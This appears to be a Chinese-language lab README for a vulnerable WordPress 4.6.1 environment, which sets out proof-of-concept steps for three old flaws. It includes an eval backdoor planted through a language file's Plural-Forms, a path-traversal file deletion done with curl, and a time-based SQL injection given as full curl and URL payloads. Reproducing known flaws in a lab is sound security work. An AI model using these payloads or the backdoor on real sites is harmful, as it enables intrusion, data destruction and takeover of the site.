## 环境说明

- 镜像src/wordpress/4.6.1/

  - 后台地址

    http://127.0.0.1/wp-login.php

  - 账号/密码

    admin/admin



## gettext + create_function 构建 wordpress 后门

测试镜像

* src/wordpress/4.6.1/

参考链接

* [Wordpress <= 4.6.1 使用语言文件任意代码执行漏洞分析](https://paper.seebug.org/63/)

Poc

1. [下载语言文件](https://translate.wordpress.org/projects/wp/4.6.x/zh-cn/default)
2. 编辑 PO 文件，修改 `Plural-Forms`
   * e.g `"Plural-Forms: nplurals=1; plural=@eval($_GET[0]);\n"`
3. 在 wordpress 后台使用这个语言文件   
4. 访问 /index.php?0=phpinfo(); 进行测试




## Wordpress <= 4.9.6 任意文件删除漏洞

测试镜像

- src/wordpress/4.6.1/

影响版本

- wordpress <= 4.9.6

参考链接

- [Wordpress <= 4.9.6 任意文件删除漏洞](https://xz.aliyun.com/t/2413)

Poc

1、登录后台，在Dashboadrd->Media->Add New处上传任意图片（如 src/wordpress/4.6.1/demo.jpeg）

2、点击edit编辑上传的图片，记录url中的item或post参数，如post=4

3、在edit页面上查找包含_wpnonce的input标签，记录value

`<input type="hidden" id="_wpnonce" name="_wpnonce" value="c9d6fb475f">`

4、浏览器中提取登录后的cookie，执行curl修改thumb为要删除的文件（环境中预先创建了用于测试的test_del_file.txt文件）：

```shell
curl 'http://172.17.0.2/wp-admin/post.php?post=4' --cookie "登录后的cookie" -d 'action=editattachment&_wpnonce=c9d6fb475f&thumb=../../../../test_del_file.txt'
```

5、在编辑图片页面点击Delete Permanently删除上传的图片，触发漏洞删除文件test_del_file.txt



## Wordpress <= 4.8.2 SQL注入漏洞

测试镜像

- src/wordpress/4.6.1/

影响版本

- wordpress <= 4.8.2

参考链接

- [WordPress ≤ 4.8.2 POST META 校验绕过漏洞](http://www.freebuf.com/vuls/153959.html)

Poc

1、登录后台，在Dashboadrd->Media->Add New处上传任意图片（如 src/wordpress/4.6.1/demo.jpeg）

2、编辑上传的图片，记录url中的post或item参数，如post=4

3、在Posts->All Posts中点击任意文章进行编辑，记录url中的post参数值，如post=1，在html中搜索_ajax_nonce-add-meta，记录value，如 `ajax_nonce-add-meta=24fb4aa9b9"`

4、浏览器中提取登录后的cookie，执行curl添加字段，参数_ajax_nonce-add-meta为3中提取的值，metavalue开头数字为上传图片的item值，这里为4，post_id为3中获取的post：

```shell
curl 'http://172.17.0.2/wp-admin/admin-ajax.php' --cookie "登录后的cookie" -d '_ajax_nonce=0&action=add-meta&metakeyinput=%00_thumbnail_id&metavalue=4%20%251$%25s%20or%20sleep(10)%23&_ajax_nonce-add-meta=24fb4aa9b9&post_id=1'
```

5、在http://172.17.0.2/wp-admin/edit.php页面上查找包含_wpnonce的input标签，记录value

`<input type="hidden" id="_wpnonce" name="_wpnonce" value="233a3d3d36">`

6、使用获取的\_wpnonce参数访问`http://172.17.0.2/wp-admin/edit.php?action=delete&_wpnonce=获取的参数&ids=4%20%251$%25s%20or%20sleep(10)%23`触发漏洞（产生查询延迟）